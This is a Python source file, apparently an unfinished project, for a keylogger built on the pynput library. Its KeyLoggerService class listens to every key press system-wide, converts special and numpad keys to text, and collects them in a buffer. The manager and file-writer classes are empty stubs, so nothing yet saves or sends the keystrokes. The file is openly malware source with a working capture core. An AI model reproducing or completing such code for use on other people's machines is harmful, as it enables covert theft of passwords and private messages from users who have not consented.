from abc import ABC , abstractmethod
import time
import datetime
from pynput.keyboard import Listener , Key , KeyCode , GlobalHotKeys
import json

class Writer(ABC):
    @abstractmethod
    def write(self , data):
        pass

class KeyLoggerService:
    def __init__(self):
        self.keys = str()
        self.listener =  Listener(on_press= self._on_press ,on_release= None)

    def start_listening(self):
        self.listener.start()

    def stop_listening(self):
        self.listener.stop()

    def get_keys(self):
        temp = self.keys
        self.keys = str()
        return temp

    def _on_press(self , key):
        updated_key = KeyLoggerService._correction_keys(key)
        self.keys += updated_key

    @staticmethod
    def _correction_keys(key):
        dict_special = {
            Key.space: ' ', Key.enter: '\n', Key.tab: '\t'
        }
        if key in dict_special:
            return dict_special[key]
        elif isinstance(key, KeyCode) and key.vk is not None:
            if 96 <= key.vk <= 105:
                return str(key.vk - 96)
        elif hasattr(key, 'char') and key.char is not None:
            return key.char

        return str(key)



class KeyLoggerManger:
    pass

class WriteToFile(Writer):
    def __init__(self):
        pass
    def write(self , data):
        pass



